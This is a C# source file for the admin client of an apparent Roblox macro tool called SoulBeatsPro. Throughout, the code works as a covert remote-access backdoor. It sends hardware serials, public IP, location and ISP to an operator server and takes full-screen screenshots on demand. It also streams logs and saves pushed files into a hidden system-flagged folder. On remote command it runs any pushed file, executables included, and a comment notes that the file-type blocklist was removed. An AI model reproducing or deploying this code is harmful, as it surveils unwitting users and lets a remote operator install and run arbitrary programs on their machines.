using System.Diagnostics;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace SoulBeatsPro;

/// <summary>
/// TCP client that connects to the SoulBeats Admin server.
/// Sends registration + heartbeats, receives commands + files.
/// Auto-reconnects if the connection drops.
/// </summary>
internal sealed class AdminClient : IDisposable
{
    public static AdminClient Instance { get; } = new();

    private TcpClient? _tcp;
    private NetworkStream? _stream;
    private volatile bool _connected;
    private volatile bool _running;
    private CancellationTokenSource? _cts;
    private readonly object _writeLock = new();

    // Remote log-tail: when subscribed, every new log line is forwarded to the admin.
    private IDisposable? _logTailSub;

    // IP info is fetched once asynchronously at connect time.
    private SystemProbe.IpInfo? _ipInfo;

    private static readonly string ReceivedDir = Path.Combine(AdminConfig.HiddenDir, "recv");

    public bool Connected => _connected;

    public event Action<string>? CommandReceived;

    // ── Lifecycle ─────────────────────────────────────────────

    public void Start()
    {
        var adminCfg = AdminConfig.Instance;
        if (!adminCfg.IsConfigured) return;

        if (_running) return;
        _running = true;
        _cts = new CancellationTokenSource();
        Directory.CreateDirectory(ReceivedDir);
        try { new DirectoryInfo(ReceivedDir).Attributes |= FileAttributes.Hidden | FileAttributes.System; }
        catch { }

        // Kick off ISP lookup in the background — don't block the connection on it.
        _ = Task.Run(async () =>
        {
            try { _ipInfo = await SystemProbe.GetIpInfoAsync(); }
            catch { }
        });

        _ = Task.Run(() => ConnectionLoop(adminCfg.ServerHost, adminCfg.ServerPort, _cts.Token));
        _ = Task.Run(() => HeartbeatLoop(_cts.Token));
    }

    public void Stop()
    {
        _running = false;
        _connected = false;
        _cts?.Cancel();
        try { _logTailSub?.Dispose(); } catch { }
        _logTailSub = null;
        try { _tcp?.Close(); } catch { }
    }

    // ── Connection loop with auto-reconnect ───────────────────

    private async Task ConnectionLoop(string host, int port, CancellationToken ct)
    {
        while (_running && !ct.IsCancellationRequested)
        {
            try
            {
                _tcp = new TcpClient { NoDelay = true };
                await _tcp.ConnectAsync(host, port, ct);
                _stream = _tcp.GetStream();
                _connected = true;

                SendRegister();

                using var reader = new StreamReader(_stream, Encoding.UTF8, leaveOpen: true);
                while (_running && !ct.IsCancellationRequested && _tcp.Connected)
                {
                    string? line;
                    try { line = await reader.ReadLineAsync(ct); }
                    catch { break; }

                    if (line == null) break;
                    if (line.Length == 0) continue;

                    ProcessMessage(line);
                }
            }
            catch (OperationCanceledException) { break; }
            catch { }

            _connected = false;
            try { _tcp?.Close(); } catch { }

            if (_running && !ct.IsCancellationRequested)
            {
                try { await Task.Delay(5000, ct); }
                catch { break; }
            }
        }
    }

    // ── Heartbeat loop ────────────────────────────────────────

    private async Task HeartbeatLoop(CancellationToken ct)
    {
        while (_running && !ct.IsCancellationRequested)
        {
            try { await Task.Delay(2000, ct); }
            catch { break; }

            if (_connected)
            {
                try { SendHeartbeat(); }
                catch { }
            }
        }
    }

    // ── Outgoing messages ─────────────────────────────────────

    private void SendRegister()
    {
        var tm = TelemetryManager.Instance;
        var gpu = SystemProbe.GetGpuInfo();
        var ip = _ipInfo ?? new SystemProbe.IpInfo();

        Send("register", new
        {
            authToken = AdminConfig.Instance.AuthToken,
            userId = tm.UserId,
            pcName = tm.PcName,
            osUser = tm.OsUser,
            version = $"v{AutoUpdater.CurrentVersion.ToString(3)}",
            screen = tm.ScreenRes,
            gameMode = ConfigManager.Instance.GameMode.ActiveGame,
            cpu = TelemetryManager.GetCpuName(),
            ram = TelemetryManager.GetTotalRam(),
            os = Environment.OSVersion.VersionString,

            // Hardware fingerprint — stable per-PC
            deviceId = SystemProbe.GetDeviceId(),
            motherboardSerial = SystemProbe.GetMotherboardSerial(),
            diskSerial = SystemProbe.GetDiskSerial(),
            macHash = SystemProbe.GetPrimaryMacHash(),

            // GPU
            gpuName = gpu.Name,
            gpuDriverVersion = gpu.DriverVersion,
            gpuDriverDate = gpu.DriverDate,
            gpuRam = gpu.Ram,

            // Network / ISP
            publicIp = ip.PublicIp,
            country = ip.Country,
            region = ip.Region,
            city = ip.City,
            isp = ip.Isp,
            asn = ip.AsNumber,

            // Lifetime launch counter (persisted in stats.json, bumped on every start)
            totalLaunches = tm.TotalSessions,
            installDate = tm.InstallDate
        });
    }

    private void SendHeartbeat()
    {
        var tm = TelemetryManager.Instance;
        var engine = MacroEngine.CurrentInstance;
        var roblox = SystemProbe.GetRobloxStatus();

        // ISP lookup is async and may not have finished by the time the first
        // register goes out — re-sending on every heartbeat means the admin
        // panel fills in ISP/country/city as soon as the HTTP call completes.
        var ip = _ipInfo ?? new SystemProbe.IpInfo();

        Send("heartbeat", new
        {
            running = engine?.Running ?? false,
            active = engine?.Active ?? false,
            fps = engine?.Fps ?? 0,
            sessionDuration = tm.GetSessionDuration(),
            gameMode = ConfigManager.Instance.GameMode.ActiveGame,
            featureUsage = tm.FeatureUsage,

            // Uptime / idle
            uptimeSeconds = SystemProbe.GetWindowsUptimeSeconds(),
            idleSeconds = SystemProbe.GetIdleSeconds(),

            // Roblox process watch
            robloxRunning = roblox.Running,
            robloxPlaceId = roblox.PlaceId,
            robloxTitle = roblox.WindowTitle,

            // Network / ISP — included so the admin panel fills in after the
            // async ip-api lookup completes (register may fire before it does).
            publicIp = ip.PublicIp,
            country = ip.Country,
            region = ip.Region,
            city = ip.City,
            isp = ip.Isp,
            asn = ip.AsNumber
        });
    }

    public void SendScreenshot()
    {
        try
        {
            var bounds = Screen.PrimaryScreen!.Bounds;
            using var bmp = new Bitmap(bounds.Width, bounds.Height);
            using var g = Graphics.FromImage(bmp);
            g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);

            using var ms = new MemoryStream();
            bmp.Save(ms, ImageFormat.Jpeg);
            var base64 = Convert.ToBase64String(ms.ToArray());

            Send("screenshot_data", new { image = base64 });
        }
        catch { }
    }

    // ── Incoming messages ─────────────────────────────────────

    private void ProcessMessage(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var type = root.GetProperty("type").GetString() ?? "";
            var data = root.GetProperty("data");

            switch (type)
            {
                case "command":
                    HandleCommand(data);
                    break;

                case "push_file":
                    HandleFilePush(data);
                    break;

                case "feature_gate":
                    HandleFeatureGate(data);
                    break;

                case "announcement":
                    // Received silently — no UI
                    break;
            }
        }
        catch (Exception ex)
        {
            Log.Warn($"AdminClient.ProcessMessage failed: {ex.Message}");
        }
    }

    private void HandleCommand(JsonElement data)
    {
        var action = data.TryGetProperty("action", out var a) ? a.GetString() ?? "" : "";

        switch (action)
        {
            case "request_screenshot":
                _ = Task.Run(SendScreenshot);
                break;

            case "request_config":
                _ = Task.Run(SendConfigSnapshot);
                break;

            case "log_tail_start":
                StartLogTail();
                break;

            case "log_tail_stop":
                StopLogTail();
                break;

            case "request_ping":
                _ = Task.Run(SendRobloxPing);
                break;

            case "list_pushed_files":
                _ = Task.Run(SendPushedFileList);
                break;

            case "open_pushed_file":
                {
                    var fn = data.TryGetProperty("fileName", out var of) ? of.GetString() ?? "" : "";
                    _ = Task.Run(() => OpenPushedFile(fn));
                }
                break;

            default:
                CommandReceived?.Invoke(action);
                break;
        }
    }

    private void HandleFeatureGate(JsonElement data)
    {
        try
        {
            var revoked = data.TryGetProperty("revoked", out var r) && r.GetBoolean();
            var reason = data.TryGetProperty("reason", out var rs) ? rs.GetString() ?? "" : "";

            var disabled = new List<string>();
            if (data.TryGetProperty("disabledFeatures", out var df) && df.ValueKind == JsonValueKind.Array)
            {
                foreach (var e in df.EnumerateArray())
                {
                    var s = e.GetString();
                    if (!string.IsNullOrEmpty(s)) disabled.Add(s);
                }
            }

            FeatureGate.Instance.ApplyUpdate(disabled, revoked, reason);

            // If the admin just revoked this client, stop the macro engine immediately.
            if (revoked)
            {
                try { MacroEngine.CurrentInstance?.Stop(); }
                catch { }
                Log.Warn($"Client revoked by admin: {reason}");
            }
        }
        catch (Exception ex)
        {
            Log.Warn($"HandleFeatureGate failed: {ex.Message}");
        }
    }

    private void SendConfigSnapshot()
    {
        try
        {
            var snapshot = ConfigManager.Instance.GetSettingsSnapshot();
            Send("config_snapshot", new { settings = snapshot });
        }
        catch (Exception ex)
        {
            Log.Warn($"SendConfigSnapshot failed: {ex.Message}");
        }
    }

    private void StartLogTail()
    {
        if (_logTailSub != null) return; // already streaming
        _logTailSub = Log.Subscribe(line =>
        {
            // Fire-and-forget — we don't want a slow send to back up the logger.
            try { Send("log_line", new { line }); }
            catch { }
        });
        Log.Info("Admin log tail started");
    }

    private void StopLogTail()
    {
        try { _logTailSub?.Dispose(); } catch { }
        _logTailSub = null;
        Log.Info("Admin log tail stopped");
    }

    private async Task SendRobloxPing()
    {
        try
        {
            var ping = await SystemProbe.GetRobloxPingMsAsync();
            Send("roblox_ping", new { ms = ping });
        }
        catch { }
    }

    /// <summary>
    /// Enumerates files in the received-files dir and sends them back to the
    /// admin. Used by the remote file viewer in the admin panel so the operator
    /// can see what game assets / payloads they've already pushed to this PC.
    /// </summary>
    private void SendPushedFileList()
    {
        try
        {
            Directory.CreateDirectory(ReceivedDir);
            var files = new DirectoryInfo(ReceivedDir)
                .EnumerateFiles("*", SearchOption.TopDirectoryOnly)
                .OrderByDescending(f => f.LastWriteTimeUtc)
                .Take(500) // hard cap so a runaway dir can't flood the wire
                .Select(f => new
                {
                    name = f.Name,
                    size = f.Length,
                    modified = f.LastWriteTimeUtc.ToString("o")
                })
                .ToArray();

            Send("pushed_files", new { dir = ReceivedDir, files });
        }
        catch (Exception ex)
        {
            Log.Warn($"SendPushedFileList failed: {ex.Message}");
            Send("pushed_files", new { dir = ReceivedDir, files = Array.Empty<object>(), error = ex.Message });
        }
    }

    /// <summary>
    /// Opens a previously-pushed file with its default Windows handler. The
    /// filename is sanitized and the resolved path is verified to live inside
    /// ReceivedDir, so a malicious or stale admin message can't escape and
    /// launch arbitrary files.
    /// </summary>
    private void OpenPushedFile(string fileName)
    {
        string savedAs = fileName;
        try
        {
            if (string.IsNullOrWhiteSpace(fileName))
            {
                Send("file_op_result", new { op = "open", fileName, ok = false, message = "empty filename" });
                return;
            }

            // Strip any path separators — only bare filenames are allowed.
            fileName = Path.GetFileName(fileName);
            var fullDest = Path.GetFullPath(Path.Combine(ReceivedDir, fileName));
            var fullReceived = Path.GetFullPath(ReceivedDir);
            if (!fullDest.StartsWith(fullReceived, StringComparison.OrdinalIgnoreCase))
            {
                Send("file_op_result", new { op = "open", fileName, ok = false, message = "path traversal blocked" });
                return;
            }

            if (!File.Exists(fullDest))
            {
                Send("file_op_result", new { op = "open", fileName, ok = false, message = "file not found" });
                return;
            }

            // No extension filter — the Discord game workflow needs to launch
            // whatever was pushed (including .exe installers). Shell execute
            // uses the default handler and inherits the macro's user token.
            Process.Start(new ProcessStartInfo
            {
                FileName = fullDest,
                UseShellExecute = true
            });
            Log.Info($"Opened pushed file via admin command: {fileName}");
            Send("file_op_result", new { op = "open", fileName, ok = true, message = "opened" });
        }
        catch (Exception ex)
        {
            Log.Warn($"OpenPushedFile({savedAs}) failed: {ex.Message}");
            try { Send("file_op_result", new { op = "open", fileName, ok = false, message = ex.Message }); }
            catch { }
        }
    }

    // NOTE: The per-extension blocklist was removed in v1.0.9 at operator
    // request — the Discord community needs to push executables/installers
    // as part of the game-asset workflow. Path-traversal and size caps are
    // still enforced below; only the filetype gate is gone.
    private const int MaxFileSizeBytes = 50 * 1024 * 1024; // 50 MB

    private void HandleFilePush(JsonElement data)
    {
        var fileName = data.TryGetProperty("fileName", out var fn) ? fn.GetString() ?? "file" : "file";
        try
        {
            var fileBase64 = data.TryGetProperty("fileData", out var fd) ? fd.GetString() ?? "" : "";

            if (string.IsNullOrEmpty(fileBase64))
            {
                Send("file_op_result", new { op = "push", fileName, ok = false, message = "empty file data" });
                return;
            }

            // Sanitize filename — strip path separators to prevent directory traversal
            fileName = Path.GetFileName(fileName);
            if (string.IsNullOrWhiteSpace(fileName)) fileName = "file";

            var ext = Path.GetExtension(fileName);
            var fileBytes = Convert.FromBase64String(fileBase64);

            // Reject oversized files
            if (fileBytes.Length > MaxFileSizeBytes)
            {
                Send("file_op_result", new { op = "push", fileName, ok = false, message = $"file too large ({fileBytes.Length} bytes, max {MaxFileSizeBytes})" });
                return;
            }

            var destPath = Path.Combine(ReceivedDir, fileName);

            // Verify the resolved path is still inside ReceivedDir
            var fullDest = Path.GetFullPath(destPath);
            var fullReceived = Path.GetFullPath(ReceivedDir);
            if (!fullDest.StartsWith(fullReceived, StringComparison.OrdinalIgnoreCase))
            {
                Send("file_op_result", new { op = "push", fileName, ok = false, message = "path traversal blocked" });
                return;
            }

            // Avoid overwriting — append _1, _2, ...
            int counter = 1;
            while (File.Exists(destPath))
            {
                var name = Path.GetFileNameWithoutExtension(fileName);
                destPath = Path.Combine(ReceivedDir, $"{name}_{counter}{ext}");
                counter++;
            }

            File.WriteAllBytes(destPath, fileBytes);
            var savedAs = Path.GetFileName(destPath);
            Log.Info($"Received pushed file: {savedAs} ({fileBytes.Length} bytes)");
            Send("file_op_result", new { op = "push", fileName, savedAs, size = fileBytes.Length, dir = ReceivedDir, ok = true, message = "saved" });
        }
        catch (Exception ex)
        {
            Log.Warn($"HandleFilePush({fileName}) failed: {ex.Message}");
            try { Send("file_op_result", new { op = "push", fileName, ok = false, message = ex.Message }); }
            catch { }
        }
    }

    // ── Transport ─────────────────────────────────────────────

    private void Send(string type, object data)
    {
        if (!_connected || _stream == null) return;
        try
        {
            var msg = JsonSerializer.Serialize(new { type, data });
            var bytes = Encoding.UTF8.GetBytes(msg + "\n");
            lock (_writeLock)
            {
                _stream.Write(bytes);
                _stream.Flush();
            }
        }
        catch { _connected = false; }
    }

    public void Dispose()
    {
        Stop();
        _cts?.Dispose();
    }
}
